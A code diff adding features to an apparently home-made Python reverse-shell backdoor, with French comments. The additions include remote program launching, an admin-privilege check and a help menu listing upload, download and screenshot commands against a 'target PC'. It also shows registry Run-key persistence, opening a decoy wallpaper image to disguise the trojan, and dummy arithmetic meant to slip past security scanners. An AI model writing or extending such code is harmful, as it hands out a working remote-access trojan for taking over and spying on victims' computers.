@@ -44,6 +44,16 @@ def reliable_recv():
         except ValueError:
             continue
 
+def isAdmin():
+    try:
+        # For windows
+        #os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
+        os.listdir('/root')
+        return "[+] Administrator privilegies"
+    except:
+        return "[-] User privilegies"
+
+
 def downloadFileFromTargetComputer(url):
     get_response = requests.get(url)
     file_name = url.split("/")[-1]
@@ -79,6 +89,16 @@ def shell():
             break
         # on teste si la commande c'est cd donc qu'on change de directory
         # si je fais pas √ßa le programme plante quand on change de directory
+        elif command == "help":
+            help_options = '''
+                upload path -> Upload a file to target PC
+                get url     -> Download a File to target PC From Any Website
+                start path  -> start a programm on target PC
+                screenshot  -> Take a screenshot Of targets Monitor
+                check       -> Check for the administrator privilegies
+                q           -> Exit the Reverse SHell
+            '''
+            reliable_send(help_options)
         elif len(command) > 1 and command[:2] == "cd":
             print("je rentre dans le cd")
             try:
@@ -118,6 +138,21 @@ def shell():
             except Exception as error:
                 print(error)
                 reliable_send("[-] We can't take the picture")
+        # start comme √a permet de garder le shell ouvert plutot que de faire notepad qui lui aatendra fermeture de notepad pour 
+        # r√©cup√rer le shell
+        elif command[:5] == "start":
+            try:
+                # Popen pour ouvrir le processus
+                subprocess.Popen(command[6:], shell=True)
+                reliable_send("[+] Started")
+            except:
+                reliable_send("[!!] Failed to start!")
+        elif len(command) > 1 and command[:5] == "check":
+            try:
+                log_admin = isAdmin()
+                reliable_send(log_admin)
+            except:
+                reliable_send("Cant Perform the check")
 
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -133,6 +168,14 @@ def createBackdoorOnWindowsMachine():
         # on appelle une commande de l'invite de command windows
         # cette commande permet d'ajouter au registry de demarrage windows pour les logiciels 32 bits
         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
+        file_name = sys._MEIPASS + "\Dragon-Wallpaper-Chinese.jpg"
+        try:
+            subprocess.Popen(file_name, shell=True)
+        except:
+            # op√©ration basic pour bypass les verif de secu qui vont voir ici un programme normal
+            number = 1
+            number1 = 2
+            number3 = number + number1
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
